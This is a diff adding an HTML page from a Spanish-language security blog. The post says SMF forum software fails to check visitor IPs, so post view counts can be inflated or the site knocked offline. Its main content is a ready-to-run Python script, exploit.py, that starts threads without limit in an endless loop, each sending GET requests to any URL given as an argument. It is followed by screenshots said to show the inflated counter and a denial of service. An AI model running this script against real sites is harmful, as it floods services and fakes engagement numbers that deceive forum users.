@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>SMF DoS && Enhancer of Views - Security Signal</title>
+  <meta name="author" content="q3rv0 - hdbreaker">
+
+  
+  <meta name="description" content="by hdbreakerEn esta entrada les quiero compartir una curiosidad que he descubierto ya hace algún tiempo en este famoso gestor de contenidos que &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://securitysignal.github.io/blog/2015/02/05/smf-enhancer-of-views-dos/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Signal" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Signal</a></h1>
+  
+    <h2>Looking for signs of insecurity...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="securitysignal.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">SMF DoS && Enhancer of Views</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-02-05T02:24:00-08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>5</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:24 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://www.smf-indonesia.co.id/wp-content/uploads/event/SMF_LOGO.gif" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://www.smf-indonesia.co.id/wp-content/uploads/event/SMF_LOGO.gif" height="296" width="640" /></a></div><div style="text-align: right;"><b>by hdbreaker</b></div><div style="text-align: left;"><br />En esta entrada les quiero compartir una curiosidad que he descubierto ya hace algún tiempo en este famoso gestor de contenidos que muchos foros utilizan.<br /><a name='more'></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">El mismo en todas sus versiones no valida la IP del usuario al momento de visitar su contenido, pudiendo de esta forma lograr un incremento radical en la cantidad de visitas que puede tener una publicación, pudiendo utilizar la misma para ingeniería social o ataques de Denegación de Servicios.</div><div style="text-align: left;"></div><div style="text-align: left;"><u><b>PoC:</b></u></div><div style="text-align: left;">&nbsp; </div><pre class="brush: py">import requests<br />import threading<br />import sys<br /><br />class Main():<br />  def call(self,i,url):<br />    print i<br />    requests.get(url)<br /><br /><br />  def D0S(self,url):<br />      counter = 0<br />      while True:<br />        counter = counter + 1<br />        try:<br />            t = threading.Thread(target=self.call,args=(counter,url))<br />            t.start()<br />        except:<br />            t.join()<br /><br />if(len(sys.argv)&gt;=2):<br />    init = Main()<br />    init.D0S(sys.argv[1])<br />else:<br />    print "Usage: python exploit.py [URL]"</pre><br /><div class="separator" style="clear: both; text-align: center;"><br /></div>Imagen del contador de visitas antes de la prueba:<br /><br /><div style="text-align: center;"><a href="http://1.bp.blogspot.com/-qXLY0GbcQ38/VNND1cHCqMI/AAAAAAAAAFo/LgFEB-z1CS4/s1600/re1.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-qXLY0GbcQ38/VNND1cHCqMI/AAAAAAAAAFo/LgFEB-z1CS4/s1600/re1.png" height="24" width="640" /></a></div><br />Luego de Explotar:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-4Ys5oJknWGE/VNNEEcvDhcI/AAAAAAAAAFw/n9a8MyfkRU4/s1600/re2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-4Ys5oJknWGE/VNNEEcvDhcI/AAAAAAAAAFw/n9a8MyfkRU4/s1600/re2.png" height="26" width="640" /></a></div><div style="text-align: center;"><br /></div>Al poco tiempo podemos apreciar el DoS:<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-FFlKHSM5FcI/VNNELngOboI/AAAAAAAAAF4/TdlAySs8ZnA/s1600/D0S.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-FFlKHSM5FcI/VNNELngOboI/AAAAAAAAAF4/TdlAySs8ZnA/s1600/D0S.png" height="56" width="640" /></a></div><div style="text-align: center;"><br /></div><br /></div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">HD_Breaker</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-02-05T02:24:00-08:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>5</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:24 am</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://securitysignal.github.io/blog/2015/02/05/smf-enhancer-of-views-dos/" data-via="" data-counturl="http://securitysignal.github.io/blog/2015/02/05/smf-enhancer-of-views-dos/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/02/04/ruby-vs-python-same-code/" title="Previous Post: Ruby vs Python - The Same Code">&laquo; Ruby vs Python - The Same Code</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/02/05/quien-te-choco-hackeado-patentes/" title="Next Post: ¿Quién te choco? Hackeando Patentes ">¿Quién te choco? Hackeando Patentes  &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/03/08/format-string-atack/">Format String Atack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/">Ringzer0 Level4 Pwned! By Hdbreaker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/30/securitysocket-remote-exploit-library/">SecuritySocket Remote Exploit Library</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/18/desbordando-el-buffer-en-linux-x86-iv/">Desbordando El Buffer en Linux X86 (IV)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/30/eko-party-pre-ctf/">EkoParty Pre CTF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - q3rv0 - hdbreaker -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
